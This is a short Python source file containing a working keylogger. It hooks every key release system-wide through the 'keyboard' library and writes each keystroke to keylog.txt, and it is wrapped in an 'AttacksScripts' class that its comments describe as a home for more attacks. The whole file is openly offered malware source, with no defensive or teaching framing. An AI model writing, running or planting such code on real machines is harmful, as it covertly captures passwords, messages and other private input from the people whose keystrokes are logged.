import keyboard


class Keylogger():#create the kilogger attack i a class in order later to call the attack with all the attacks
    def __init__(self, log_fileName) :#get a path for a file
        self.f = open(log_fileName,"w")#open the file/creat file with path we put on mod 'write'

    def start_log(self):
        keyboard.on_release(callback=self.new_key)
        keyboard.wait()

    def new_key(self, event):
        button_name = event.name
        if button_name == "space":
            button_name = " "
        elif button_name == "enter":
            button_name = "\n"
        self.f.write(button_name)
        self.f.flush()



class AttacksScripts():
    def __init__(self) :
        self.keylogger = Keylogger("keylog.txt")

    def start_all_attacks(self):
        self.keylogger.start_log()
        #more attacks...

if __name__ == "__main__":
    attacks = AttacksScripts()
    attacks.start_all_attacks()

